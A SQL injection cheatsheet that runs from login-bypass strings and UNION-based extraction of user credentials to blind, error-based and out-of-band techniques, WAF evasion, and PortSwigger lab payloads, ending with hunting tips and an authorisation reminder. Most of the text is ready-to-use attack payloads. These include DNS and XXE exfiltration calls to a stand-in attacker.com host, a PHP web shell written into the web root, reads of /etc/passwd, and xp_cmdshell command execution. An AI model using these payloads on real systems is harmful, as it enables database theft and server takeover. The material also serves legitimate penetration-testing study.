# SQL Injection Cheatsheet: Basic to Advanced

## Basic SQL Injection Techniques

### 1. Authentication Bypass

These payloads help bypass login forms:

```
' OR 1=1 --
' OR '1'='1' --
" OR 1=1 --
admin' --
admin'/*
' OR '1'='1
') OR ('1'='1
```

**What they do**: Create a condition that's always true (1=1), causing the query to return all rows. The `--` comments out the rest of the query.

### 2. Testing for Vulnerability

```
'
"
')
"))
;
-- 
' OR '
' AND '
```

**What they do**: Insert unexpected characters that might break the SQL syntax. If the application shows an error message or behaves unusually, it may be vulnerable.

### 3. Identifying Database Type

**MySQL:**
```
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a) --
```

**SQL Server:**
```
' AND (SELECT SUBSTRING(@@version,1,1)) = 'M' --
```

**Oracle:**
```
' AND (SELECT banner FROM v$version WHERE ROWNUM=1) LIKE '%Oracle%' --
```

**PostgreSQL:**
```
' AND (SELECT version()) LIKE '%PostgreSQL%' --
```

**What they do**: These queries try to extract database version information in a way specific to each DBMS.

## Intermediate SQL Injection Techniques

### 4. UNION-Based Injection

```
' UNION SELECT NULL --
' UNION SELECT NULL,NULL --
' UNION SELECT NULL,NULL,NULL --
```

**What they do**: Test how many columns are in the current query by adding NULLs until the query works.

```
' UNION SELECT 1,2,3 --
```

**What it does**: Helps identify which positions are displayed in the output.

```
' UNION SELECT username,password,NULL FROM users --
```

**What it does**: Extracts usernames and passwords from the users table.

### 5. Information Gathering

**Database Name:**
```
' UNION SELECT database(),NULL,NULL --      (MySQL)
' UNION SELECT DB_NAME(),NULL,NULL --       (SQL Server)
' UNION SELECT current_database(),NULL,NULL -- (PostgreSQL)
```

**Table Names:**
```
' UNION SELECT table_name,NULL,NULL FROM information_schema.tables WHERE table_schema=database() --   (MySQL)
' UNION SELECT table_name,NULL,NULL FROM all_tables --   (Oracle)
' UNION SELECT table_name,NULL,NULL FROM information_schema.tables --   (PostgreSQL/SQL Server)
```

**Column Names:**
```
' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users' --   (MySQL/PostgreSQL)
' UNION SELECT column_name,NULL,NULL FROM all_tab_columns WHERE table_name='USERS' --   (Oracle)
```

**What they do**: Extract schema information to map the database structure.

### 6. Blind SQL Injection

**Boolean-based:**
```
' AND 1=1 --    (Returns true - page loads normally)
' AND 1=2 --    (Returns false - page behaves differently)
```

**What they do**: Test if the application responds differently based on true/false conditions.

```
' AND (SELECT SUBSTRING(username,1,1) FROM users WHERE id=1)='a' --
```

**What it does**: Tests if the first character of a specific username is 'a'.

**Time-based:**
```
' AND IF(1=1,SLEEP(3),0) --   (MySQL)
' AND WAITFOR DELAY '0:0:3' --   (SQL Server)
' AND pg_sleep(3) --   (PostgreSQL)
' AND DBMS_UTILITY.GET_TIME - 3 > 0 --   (Oracle)
```

**What they do**: Cause the query to delay for 3 seconds if the condition is true.

## Advanced SQL Injection Techniques

### 7. Out-of-Band Techniques

**DNS exfiltration (SQL Server):**
```
'; DECLARE @q VARCHAR(1024); SET @q = CONCAT('SELECT * FROM users WHERE id=1; EXEC master..xp_dirtree "//',CAST((SELECT TOP 1 username FROM users) AS varchar(500)),'.attacker.com/a"'); EXEC(@q) --
```

**What it does**: Forces the database to make a DNS request to attacker.com with the username embedded in the subdomain.

### 8. File System Operations

**MySQL:**
```
' UNION SELECT NULL,load_file('/etc/passwd'),NULL --   (Read files)
' UNION SELECT NULL,NULL,"<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php' --   (Write files)
```

**What they do**: Read or write files on the database server (when permissions allow).

### 9. Command Execution

**SQL Server:**
```
'; EXEC xp_cmdshell 'whoami' --
```

**What it does**: Executes the 'whoami' command on the server (if xp_cmdshell is enabled).

### 10. Error-Based Data Extraction

**MySQL:**
```
' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT @@version), 0x7e)) --
' AND updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1) --
```

**SQL Server:**
```
' AND 1=CONVERT(int, (SELECT @@version)) --
```

**Oracle:**
```
' AND EXTRACT(XMLTYPE('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://attacker.com/"> %remote;]>')) --
```

**What they do**: Force the database to display error messages containing extracted data.

## WAF Bypass Techniques

### 11. Evading Simple Filters

**Avoiding Spaces:**
```
'OR/**/'1'='1'--
'UNION/**/SELECT/**/username,password/**/FROM/**/users--
```

**Alternate Encodings:**
```
' OR 1=1 -- (URL encoded: %27%20OR%201%3D1%20--%20)
' OR 1=1 -- (Hex encoded: 0x27204f52203d3d202d2d20)
```

**Case Manipulation:**
```
' UnIoN sElEcT username,password FrOm users --
```

**Comment Variations:**
```
' UNION SELECT username,password FROM users -- -
' UNION SELECT username,password FROM users /*
' UNION SELECT username,password FROM users #
```

**What they do**: Help bypass Web Application Firewalls (WAFs) that filter based on specific patterns.

## PortSwigger Lab-Specific Payloads

### 12. SQL Injection UNION Attack Labs

**Finding number of columns:**
```
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--  (continue until error)
```

**Determining data types:**
```
' UNION SELECT 'a',NULL,NULL--
' UNION SELECT NULL,'a',NULL--
' UNION SELECT NULL,NULL,'a'--
```

**Retrieving multiple values in a single column:**
```
' UNION SELECT NULL,CONCAT(username,':',password),NULL FROM users--
```

### 13. Blind SQL Injection Labs

**Conditional responses:**
```
' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
```

**Conditional errors:**
```
' AND (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE NULL END FROM dual)=1 --
```

**Time delays:**
```
'; SELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users --
```

**Data exfiltration:**
```
'; SELECT CASE WHEN (SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='a') THEN pg_sleep(5) ELSE pg_sleep(0) END --
```

## Real-Life Hunting Tips

1. **Always check the inputs**:
   - URL parameters
   - Form fields
   - HTTP headers (especially Cookie, User-Agent)
   - JSON/XML data in POST requests

2. **Look for error messages** that reveal SQL syntax or database information

3. **Test for blind vulnerabilities** when there are no visible errors

4. **Use automation tools wisely**:
   - SQLmap (`sqlmap -u "http://example.com/?id=1" --dbs`)
   - Burp Suite's Active Scanner

5. **Track your findings methodically** to avoid duplication of effort

6. **Always get proper authorization** before testing for SQL injection vulnerabilities

Remember, ethical hacking requires permission. Only use these techniques on systems you own or have explicit permission to test.
